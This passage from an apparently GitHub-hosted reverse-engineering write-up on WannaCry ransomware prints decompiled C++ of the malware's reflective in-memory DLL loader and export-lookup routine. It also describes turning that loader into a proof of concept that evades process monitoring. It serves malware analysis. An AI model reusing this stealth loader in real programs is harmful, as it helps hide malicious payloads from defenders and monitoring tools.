        <th>0x0000:0x0007</th>
        <th>MagicCode</th>
		<th>"WANACRY!"</th>
    </tr>
	<tr>
        <th>0x0008:0x000B</th>
        <th>Size of Encrypt AES Vector</th>
		<th></th>
    </tr>
	<tr>
        <th>0x000C:0x010B</th>
        <th>Body of Encrypt AES Vector</th>
		<th></th>
    </tr>
	<tr>
        <th>0x010C:0x011F</th>
        <th>Blank 4 bytes</th>
		<th></th>
    </tr>
	<tr>
        <th>0x0110:0x0117</th>
        <th>File Size</th>
		<th></th>
    </tr>
	<tr>
        <th>0x0118:Numble of size</th>
        <th>File Content</th>
		<th></th>
    </tr>
</table>

**PeBuilder**

Wannacry has just released in the ResourceData t.wnry out, and through the above decryption action successfully placed in memory a PE File, can now use PeBuilder for dynamic loading. PeBuilder is very sophisticated, and very cumbersome.

```C++
CPeBuilder *__cdecl BuildPEExecutable(DOS_Header *fileBuffer, size_t nFileSize, LPVOID (__cdecl *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD, int), int (__cdecl *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType, int), HMODULE (__cdecl *LoadLibraryA)(LPCSTR lpLibFileName), int (__cdecl *GetProcAddress)(HMODULE, LPCSTR, DWORD), BOOL (__cdecl *FreeLibrary)(HMODULE hLibModule), int zero)
{
  IMAGE_NT_HEADERS *pPEHead; 
  DWORD dwSectionAlignment; 
  int wNumberOfSections;
  data_directory *data_dir; 
  __int32 sectionSize; 
  __int32 sectionVirtualAddress; 
  int j;
  HMODULE hKernel32; 
  void (__stdcall *fpGetNativeSystemInfo)(SYSTEM_INFO *); 
  DWORD nPage; 
  DWORD dwSize; 
  LPVOID lpPEFile; 
  HANDLE hHeap; 
  CPeBuilder *TmpVar; 
  CPeBuilder *pPeBuilder; 
  IMAGE_NT_HEADERS *PEHeader; 
  DWORD lpEntryPoint; 
  SYSTEM_INFO lpSystemInfo; 
  unsigned int i; 
  LPVOID zeroa; 

  i = 0;
  if ( !WncryCheckFileSize(nFileSize, 64u) )
    return 0;
  if ( fileBuffer->signature != 'ZM' )
    goto LABEL_3;
  if ( !WncryCheckFileSize(nFileSize, *&fileBuffer->reserved2[4] + 248) )
    return 0;
  pPEHead = (fileBuffer + *&fileBuffer->reserved2[4]);
  if ( pPEHead->Signature != 'EP' )
    goto LABEL_3;
  if ( pPEHead->FileHeader.Machine != 0x14C )
    goto LABEL_3;
  dwSectionAlignment = pPEHead->OptionalHeader.SectionAlignment;
  if ( dwSectionAlignment & 1 )
    goto LABEL_3;
  wNumberOfSections = pPEHead->FileHeader.NumberOfSections;
  if ( pPEHead->FileHeader.NumberOfSections )
  {
    data_dir = (&pPEHead->OptionalHeader.SizeOfUninitializedData + pPEHead->FileHeader.SizeOfOptionalHeader);
    do
    {
      sectionSize = data_dir->Size;
      sectionVirtualAddress = data_dir->VirtualAddress;
      if ( sectionSize )
        j = sectionSize + sectionVirtualAddress;
      else
        j = dwSectionAlignment + sectionVirtualAddress;
      if ( j > i )
        i = j;
      data_dir += 5;
      --wNumberOfSections;
    }
    while ( wNumberOfSections );
  }
  hKernel32 = GetModuleHandleA(szKernel32);
  if ( !hKernel32 )
    return 0;
  fpGetNativeSystemInfo = GetProcAddress(hKernel32, aGetnativesyste, 0);
  if ( !fpGetNativeSystemInfo )
    return 0;
  fpGetNativeSystemInfo(&lpSystemInfo);
  nPage = ~(lpSystemInfo.dwPageSize - 1);
  dwSize = nPage & (pPEHead->OptionalHeader.SizeOfImage + lpSystemInfo.dwPageSize - 1);
  if ( dwSize != (nPage & (lpSystemInfo.dwPageSize + i - 1)) )
  {
LABEL_3:
    SetLastError(ERROR_BAD_EXE_FORMAT);
    return 0;
  }
  lpPEFile = VirtualAlloc(pPEHead->OptionalHeader.ImageBase, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE, zero);
  if ( !lpPEFile )
  {
    lpPEFile = VirtualAlloc(0, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE, zero);
    if ( !lpPEFile )
    {
LABEL_24:
      SetLastError(ERROR_OUTOFMEMORY);
      return 0;
    }
  }
  hHeap = GetProcessHeap();
  TmpVar = HeapAlloc(hHeap, 8u, 0x3Cu);
  pPeBuilder = TmpVar;
  if ( !TmpVar )
  {
    VirtualFree(lpPEFile, 0, MEM_RELEASE, zero);
    goto LABEL_24;
  }
  TmpVar->ImageBase = lpPEFile;
  LOWORD(TmpVar) = pPEHead->FileHeader.Characteristics;
  pPeBuilder->bitResult = (TmpVar >> 13) & 1;
  pPeBuilder->fpVirtualAlloc = VirtualAlloc;
  pPeBuilder->fpVirtualFree = VirtualFree;
  pPeBuilder->fpLoadLibraryA = LoadLibraryA;
  pPeBuilder->fpGetProcAddress = GetProcAddress;
  pPeBuilder->fpFreeLibrary = FreeLibrary;
  pPeBuilder->Placeholder = zero;
  pPeBuilder->dwPageSize = lpSystemInfo.dwPageSize;// The page size and the granularity of page protection and commitment. This is the page size used by the VirtualAlloc function.
  if ( !WncryCheckFileSize(nFileSize, pPEHead->OptionalHeader.SizeOfHeaders)
    || (zeroa = VirtualAlloc(lpPEFile, pPEHead->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE, zero),
        memcpy(zeroa, fileBuffer, pPEHead->OptionalHeader.SizeOfHeaders),
        PEHeader = (zeroa + *&fileBuffer->reserved2[4]),
        pPeBuilder->PEHeader = PEHeader,
        PEHeader->OptionalHeader.ImageBase = lpPEFile,
        !WncryBuildPESection(fileBuffer, nFileSize, pPEHead, pPeBuilder))
    || (pPeBuilder->PEHeader->OptionalHeader.ImageBase == pPEHead->OptionalHeader.ImageBase ? (pPeBuilder->bRelocation = 1) : (pPeBuilder->bRelocation = WncryBaseRelocation(pPeBuilder, pPeBuilder->PEHeader->OptionalHeader.ImageBase - pPEHead->OptionalHeader.ImageBase)),
        !WncryFixImportTable(pPeBuilder) || !WncrySetPageProtect(pPeBuilder) || !WncryPerformTlsCallback(pPeBuilder)) )
  {
LABEL_37:
    WncryReleasePE(pPeBuilder);
    return 0;
  }
  lpEntryPoint = pPeBuilder->PEHeader->OptionalHeader.AddressOfEntryPoint;
  if ( lpEntryPoint )
  {
    if ( pPeBuilder->bitResult )
    {
      if ( !((lpPEFile + lpEntryPoint))(lpPEFile, 1, 0) )
      {
        SetLastError(ERROR_DLL_INIT_FAILED);
        goto LABEL_37;
      }
      pPeBuilder->bEP = 1;
    }
    else
    {
      pPeBuilder->lpEntryPoint = (lpPEFile + lpEntryPoint);
    }
  }
  else
  {
    pPeBuilder->lpEntryPoint = 0;
  }
  return pPeBuilder;
}
```

I believe that even if it is translated into C++ code, See the length of the code will feel very irritable, not to mention I see the assembly level code. Then I just talk about it, this function will return a PeBuilder object, it will solve all the system level of work while to load the pe object.

```C++
!WncryBuildPESection(fileBuffer, nFileSize, pPEHead, pPeBuilder))
    || (pPeBuilder->PEHeader->OptionalHeader.ImageBase == pPEHead->OptionalHeader.ImageBase ? (pPeBuilder->bRelocation = 1) : (pPeBuilder->bRelocation = WncryBaseRelocation(pPeBuilder, pPeBuilder->PEHeader->OptionalHeader.ImageBase - pPEHead->OptionalHeader.ImageBase)),
        !WncryFixImportTable(pPeBuilder) || !WncrySetPageProtect(pPeBuilder) || !WncryPerformTlsCallback(pPeBuilder)) )
```

Above is some important fragments, if you do not carefully read the above large code, please look this.

The PeBuilder powerful thing is that only the use of the following five system API, so even with the Monitor tool can not find a Loaddll action inside.

- VirtualAlloc
- VirtualFree
- LoadLibraryA
- GetProcAddress
- FreeLibrary

Although there are LoadLibrary but seemingly no use.

CPeBuilder data structure is as follows:

```C++
struct CPeBuilder
{
  IMAGE_NT_HEADERS *PEHeader;
  void *ImageBase;
  DWORD *pArrayLibs;
  int dwNumOfLibs;
  int bEP;
  int bitResult;
  int bRelocation;
  LPVOID (__cdecl *fpVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD, int);
  int (__cdecl *fpVirtualFree)(LPVOID, SIZE_T, DWORD, int);
  HMODULE (__cdecl *fpLoadLibraryA)(LPCSTR lpLibFileName);
  int (__cdecl *fpGetProcAddress)(HMODULE, LPCSTR, DWORD);
  BOOL (__cdecl *fpFreeLibrary)(HMODULE hLibModule);
  int Placeholder;
  int lpEntryPoint;
  DWORD dwPageSize;
};
```

Where ImageBase points to a buffer in memory, which is BaseAddress of a loaded Dll module.

After getting the CPeBuilder object, Wannacry uses the Seek2TaskStart method to locate the TaskStart function exported in the Dll and calls the function to actually start the second phase of the attack.

```C++
int __cdecl Seek2TaskStart(CPeBuilder *pPeBuilder, char *szTaskStart)
{
  void *ImageBase; 
  IMAGE_DATA_DIRECTORY *dd_export; 
  DWORD va; 
  unsigned int dwNumberOfNames;
  IMAGE_EXPORT_DIRECTORY *va_export; 
  DWORD Base; 
  DWORD funcOrdinal; 
  DWORD AddressOfNames; 
  DWORD AddressOfNameOrdinals; 
  DWORD nCount; 

  ImageBase = pPeBuilder->ImageBase;
  dd_export = pPeBuilder->PEHeader->OptionalHeader.DataDirectory;
  ImageBase = pPeBuilder->ImageBase;
  if ( !pPeBuilder->PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size )
    goto LABEL_10;
  va = dd_export->VirtualAddress;
  dwNumberOfNames = *(ImageBase + dd_export->VirtualAddress + 0x18);
  va_export = (ImageBase + va);
  if ( !dwNumberOfNames || !va_export->NumberOfFunctions )
    goto LABEL_10;
  if ( !HIWORD(szTaskStart) )
  {
    Base = va_export->Base;
    if ( szTaskStart >= Base )
    {
      funcOrdinal = szTaskStart - Base;
      goto LABEL_13;
    }
LABEL_10:
    SetLastError(ERROR_PROC_NOT_FOUND);
    return 0;
  }
  AddressOfNames = (ImageBase + va_export->AddressOfNames);
  AddressOfNameOrdinals = (ImageBase + va_export->AddressOfNameOrdinals);
  nCount = 0;
  if ( dwNumberOfNames <= 0 )
    goto LABEL_10;
  while ( stricmp(szTaskStart, ImageBase + *AddressOfNames) )
  {
    ++nCount;
    AddressOfNames += 4;
    AddressOfNameOrdinals += 2;
    if ( nCount >= va_export->NumberOfNames )
      goto LABEL_10;
  }
  funcOrdinal = *AddressOfNameOrdinals;
LABEL_13:
  if ( funcOrdinal > va_export->NumberOfFunctions )
    goto LABEL_10;
  return (ImageBase + *(ImageBase + 4 * funcOrdinal + va_export->AddressOfFunctions));
}
```

The above function takes CPeBuilder and a Func Name as a parameter. The program searches for an export function named FuncName in the export of PE and returns the export function.

```C++
while ( stricmp(szTaskStart, ImageBase + *AddressOfNames) )
  {
    ++nCount;
    AddressOfNames += 4;
    AddressOfNameOrdinals += 2;
    if ( nCount >= va_export->NumberOfNames )
      goto LABEL_10;
  }
```

This part of the code is in the search export function table.


```C++
fpTaskStart = Seek2TaskStart(pPeBuilder, szTaskStart);
            if ( fpTaskStart )
              fpTaskStart(0, 0);
```

Call the export function, the attack starts.


## phase two ##

payload dll in-depth analysis has been done, I need some time to write report in here.

## phase three ##

PeLoader weapons have been extracted, we all know, malware industry has been modular, the production of the virus wanted to produce the same product, there are upstream factory production of raw materials, downstream factories through the assembly of raw materials into the product.

The black market can be traded to many components, hackers can choose these components to maximize the degree of accelerated virus production, when build a car are no one like to start from the wheels. We can look at the black market on a variety of virus components can trade what price, such as I want to show PeLoader.

Through the first phase of the analysis, I have mastered the full design of tasksche.exe, so I can easily locate the location to 0x4021E9, Wannacry 0x004021E9 is a component of its PeLoader entrance, which is obtained through the analysis Conclusion, this function is used to load a dll to memory, and do not call the Microsoft API case to complete the import table repair, base address relocation and other operations, hide the dll load behavior, even monitor can not be found.

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/extractor/BuildPeExecutor.png)

In order to call the function in Dll, I also need a feature is SeekFunction, which is responsible for searching Dll's export table, find the need to call the function. Its position is at 0x402924.

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/extractor/SeekFunction.png)

Through some efforts, including the extraction of assembly instructions code to solve the cross reference, directive, switch bitmap, SEH, compile, Link and other issues, I got the Peloader assembly instruction code, and successfully compiled into the object file.

当前，一切问题都已经解决，并且POC代码也写好了。 简单说下POC代码分两部分，一部分是自己写了一个SayHi.dll，这个dll导出一个getMessage的function，这个function很简单就返回一个字符串。PeLoader只要能加载这个dll，并调用getMessage就说明抽取武器成功。
第二部分就是整合了PeLoader汇编代码的测试程序，它会先将SayHi.dll读入内存，然后调用上面的BuildPeExecutor加载dll，然后调用seekFunction找到getMessage函数的其实地址并调用。

At present, all the problems have been resolved, and POC code is also written. Simply put the POC code in two parts, one is SayHi.dll, the dll export the getMessage function, this function is very simple to return a string. If the PeLoader can load the dll and call getMessage, it shows the success of extracting the weapon.
The second part is the integration of the PeLoader assembly code of the test program, it will first read SayHi.dll memory, call the above BuildPeExecutor load dll, and then call seekFunction getMessage function to find the address and call.

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/extractor/SayHi.png)

This is the getMessage implementation in SayHi.dll

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/extractor/call_getMessage.png)

This is part of the POC code implementation, so the expected result is the program, first print "Load Success successful", and then print out "Hi Guys".

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/extractor/ExpolitSuccess.png)

Finally, through procmon.exe to confirm that the whole process is not no LoadImage action, because the purpose of hacking is that, hide the payload.

![](https://github.com/tedzhang2891/Ransomware/blob/master/Wannacry/extractor/procmon.png)

Note that the LoadImage operation on the above figure does not have SayHi, but SayHi has been successfully loaded, and getMessage has been successfully called.